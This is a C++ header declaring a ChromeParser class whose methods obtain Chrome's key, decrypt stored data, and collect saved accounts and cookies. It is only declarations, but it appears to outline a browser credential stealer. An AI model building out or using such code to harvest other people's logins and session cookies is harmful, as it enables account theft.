#pragma once
#ifndef CHROMEPARSER_HEADER
#define CHROMEPARSER_HEADER

#include "BaseBrowser.h"

class ChromeParser : public BaseBrowser
{
	static vector<BYTE> GetChromeKey(String chromeRPath);
	static String DecryptWithKey(vector<BYTE>, String);
	static String ChromeDecrypt(String chromePath, String txt);
	static vector<BYTE> RawEncrpyt(vector<BYTE>);
public:
	ChromeParser();
	virtual List<AccountData> CollectAccounts();
	virtual List<CookieData> CollectCookie();
};


#endif
